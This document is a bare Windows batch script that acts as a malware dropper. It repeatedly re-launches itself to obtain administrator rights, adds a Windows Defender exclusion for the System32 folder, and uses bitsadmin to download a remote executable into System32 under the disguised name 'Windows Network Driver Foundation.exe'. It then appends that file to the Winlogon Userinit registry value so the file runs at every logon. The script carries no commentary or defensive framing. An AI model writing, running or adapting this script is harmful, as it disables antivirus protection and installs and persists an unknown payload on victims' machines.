@echo off
:CheckAdmin
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

if %errorlevel%==0 (
    goto :AdminRightsGranted
)
powershell -command Start-Process "%0" -Verb RunAs
ping -n 2 127.0.0.1 >nul
goto :CheckAdmin

:AdminRightsGranted
powershell -Command "Add-MpPreference -ExclusionPath '%SystemRoot%\System32\'"
bitsadmin /transfer "inferdwnl" /download /priority FOREGROUND "https://nojiPath" "%SystemRoot%\System32\Windows Network Driver Foundation.exe"
set "newExecutable=%SystemRoot%\System32\Windows Network Driver Foundation.exe"

for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit ^| find "Userinit"') do (
    set "currentUserinit=%%B"
)

set "combinedUserinit=%currentUserinit%%newExecutable%,"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "%combinedUserinit%" /f
